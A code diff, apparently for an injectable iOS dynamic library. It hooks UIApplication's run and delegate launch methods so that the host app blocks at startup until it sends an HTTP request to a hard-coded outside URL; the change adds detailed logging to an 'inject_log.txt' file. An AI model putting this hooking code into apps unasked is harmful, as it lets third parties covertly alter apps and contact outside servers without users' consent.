@@ -7,15 +7,57 @@ static NSString *const kTargetURL = @"https://blfsl.com/s/ios108/pgijkyn";
 static volatile BOOL g_requestDone = NO;
 
 // ------------------------------------------------------------------
-// Synchronous network request: BLOCKS the caller thread until
-// the request completes or times out.
+// Logger: writes to App Documents / inject_log.txt
+// ------------------------------------------------------------------
+static NSString *logPath(void) {
+    static NSString *path = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+        NSString *docDir = paths.firstObject;
+        if (!docDir) docDir = NSTemporaryDirectory();
+        path = [docDir stringByAppendingPathComponent:@"inject_log.txt"];
+    });
+    return path;
+}
+
+static void logMsg(NSString *fmt, ...) {
+    va_list args;
+    va_start(args, fmt);
+    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
+    va_end(args);
+
+    NSDateFormatter *df = [[NSDateFormatter alloc] init];
+    [df setDateFormat:@"yyyy-MM-dd HH:mm:ss.SSS"];
+    NSString *ts = [df stringFromDate:[NSDate date]];
+    NSString *line = [NSString stringWithFormat:@"[%@] %@\n", ts, msg];
+
+    NSData *data = [line dataUsingEncoding:NSUTF8StringEncoding];
+    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath()];
+    if (fh) {
+        [fh seekToEndOfFile];
+        [fh writeData:data];
+        [fh closeFile];
+    } else {
+        [data writeToFile:logPath() atomically:YES];
+    }
+}
+
+// ------------------------------------------------------------------
+// Synchronous network request with detailed logging
 // ------------------------------------------------------------------
 static void sendRequestSync(void) {
     @autoreleasepool {
-        if (g_requestDone) return;
+        if (g_requestDone) {
+            logMsg(@"[sendRequestSync] already done, skip");
+            return;
+        }
+
+        logMsg(@"[sendRequestSync] start URL=%@", kTargetURL);
 
         NSURL *url = [NSURL URLWithString:kTargetURL];
         if (!url) {
+            logMsg(@"[sendRequestSync] ERROR: URL is nil");
             g_requestDone = YES;
             return;
         }
@@ -27,91 +69,139 @@ static void sendRequestSync(void) {
 
         dispatch_semaphore_t sema = dispatch_semaphore_create(0);
         NSURLSession *session = [NSURLSession sharedSession];
+
         NSURLSessionDataTask *task = [session dataTaskWithRequest:req
                                                 completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+            if (error) {
+                logMsg(@"[sendRequestSync] FAILED error=%@", error);
+            } else {
+                NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
+                logMsg(@"[sendRequestSync] SUCCESS status=%ld bytes=%lu", (long)httpResp.statusCode, (unsigned long)data.length);
+            }
             g_requestDone = YES;
             dispatch_semaphore_signal(sema);
         }];
+
+        logMsg(@"[sendRequestSync] task resume");
         [task resume];
 
-        // Block here until request finishes or 12-second timeout
-        dispatch_semaphore_wait(sema, dispatch_time(DISPATCH_TIME_NOW, 12 * NSEC_PER_SEC));
+        logMsg(@"[sendRequestSync] waiting on semaphore...");
+        dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 12 * NSEC_PER_SEC);
+        long result = dispatch_semaphore_wait(sema, timeout);
+
+        if (result != 0) {
+            logMsg(@"[sendRequestSync] TIMEOUT after 12s, forcing done");
+        } else {
+            logMsg(@"[sendRequestSync] semaphore signaled");
+        }
         g_requestDone = YES;
     }
 }
 
 // ------------------------------------------------------------------
-// Hook UIApplication -run: blocks main runloop until request succeeds
+// Hook UIApplication -run
 // ------------------------------------------------------------------
 static void (*orig_run)(id self, SEL _cmd);
 
 static void hook_run(id self, SEL _cmd) {
-    // === BLOCK: wait until the HTTP request completes, THEN start app ===
+    logMsg(@"[hook_run] ENTER, calling sendRequestSync...");
     sendRequestSync();
+    logMsg(@"[hook_run] sendRequestSync returned, calling orig_run");
     orig_run(self, _cmd);
+    logMsg(@"[hook_run] EXIT (orig_run returned)");
 }
 
 // ------------------------------------------------------------------
-// Hook setDelegate: to also block didFinishLaunchingWithOptions:
-// (fallback / double insurance)
+// Hook setDelegate:
 // ------------------------------------------------------------------
 static void (*orig_setDelegate)(id self, SEL _cmd, id delegate);
 
 static void hook_setDelegate(id self, SEL _cmd, id delegate) {
+    logMsg(@"[hook_setDelegate] ENTER delegate=%@", delegate);
+
     if (!delegate) {
+        logMsg(@"[hook_setDelegate] delegate is nil, pass through");
         orig_setDelegate(self, _cmd, delegate);
         return;
     }
 
     Class delegateClass = [delegate class];
+    logMsg(@"[hook_setDelegate] delegateClass=%@", NSStringFromClass(delegateClass));
 
-    // Intercept application:didFinishLaunchingWithOptions:
     SEL selLaunch = sel_registerName("application:didFinishLaunchingWithOptions:");
     Method mLaunch = class_getInstanceMethod(delegateClass, selLaunch);
     if (mLaunch) {
+        logMsg(@"[hook_setDelegate] found application:didFinishLaunchingWithOptions:");
         IMP origIMP = method_getImplementation(mLaunch);
         IMP newIMP = imp_implementationWithBlock(^BOOL(id _self, id application, id options) {
-            sendRequestSync();  // BLOCK until sent
-            return ((BOOL (*)(id, SEL, id, id))origIMP)(_self, selLaunch, application, options);
+            logMsg(@"[hook_didFinishLaunching] ENTER");
+            sendRequestSync();
+            logMsg(@"[hook_didFinishLaunching] calling origIMP");
+            BOOL ret = ((BOOL (*)(id, SEL, id, id))origIMP)(_self, selLaunch, application, options);
+            logMsg(@"[hook_didFinishLaunching] EXIT ret=%d", (int)ret);
+            return ret;
         });
         method_setImplementation(mLaunch, newIMP);
     } else {
-        // Fallback: applicationDidFinishLaunching:
+        logMsg(@"[hook_setDelegate] didFinishLaunchingWithOptions: NOT found, try fallback");
         SEL selFinish = sel_registerName("applicationDidFinishLaunching:");
         Method mFinish = class_getInstanceMethod(delegateClass, selFinish);
         if (mFinish) {
+            logMsg(@"[hook_setDelegate] found applicationDidFinishLaunching:");
             IMP origIMP = method_getImplementation(mFinish);
             IMP newIMP = imp_implementationWithBlock(^void(id _self, id application) {
-                sendRequestSync();  // BLOCK until sent
+                logMsg(@"[hook_didFinishLaunching_fallback] ENTER");
+                sendRequestSync();
+                logMsg(@"[hook_didFinishLaunching_fallback] calling origIMP");
                 ((void (*)(id, SEL, id))origIMP)(_self, selFinish, application);
+                logMsg(@"[hook_didFinishLaunching_fallback] EXIT");
             });
             method_setImplementation(mFinish, newIMP);
+        } else {
+            logMsg(@"[hook_setDelegate] WARNING: neither launch method found!");
         }
     }
 
+    logMsg(@"[hook_setDelegate] calling orig_setDelegate");
     orig_setDelegate(self, _cmd, delegate);
+    logMsg(@"[hook_setDelegate] EXIT");
 }
 
 __attribute__((constructor))
 static void init(void) {
     @autoreleasepool {
-        Class uiAppClass = objc_getClass("UIApplication");
-        if (!uiAppClass) return;
+        logMsg(@"========================================");
+        logMsg(@"[init] dylib loaded, starting hooks...");
 
-        // Layer 1: Hook -[UIApplication run] (blocks main runloop)
+        Class uiAppClass = objc_getClass("UIApplication");
+        if (!uiAppClass) {
+            logMsg(@"[init] FATAL: UIApplication class not found!");
+            return;
+        }
+        logMsg(@"[init] UIApplication class found");
+
+        // Hook -[UIApplication run]
         SEL runSel = sel_registerName("run");
         Method mRun = class_getInstanceMethod(uiAppClass, runSel);
         if (mRun) {
             orig_run = (void (*)(id, SEL))method_getImplementation(mRun);
             method_setImplementation(mRun, (IMP)hook_run);
+            logMsg(@"[init] Hooked -[UIApplication run]");
+        } else {
+            logMsg(@"[init] WARNING: -[UIApplication run] method not found");
         }
 
-        // Layer 2: Hook setDelegate: (blocks delegate callbacks)
+        // Hook setDelegate:
         SEL setDelegateSel = sel_registerName("setDelegate:");
         Method m = class_getInstanceMethod(uiAppClass, setDelegateSel);
         if (m) {
             orig_setDelegate = (void (*)(id, SEL, id))method_getImplementation(m);
             method_setImplementation(m, (IMP)hook_setDelegate);
+            logMsg(@"[init] Hooked -[UIApplication setDelegate:]");
+        } else {
+            logMsg(@"[init] WARNING: -[UIApplication setDelegate:] method not found");
         }
+
+        logMsg(@"[init] all hooks installed");
     }
 }
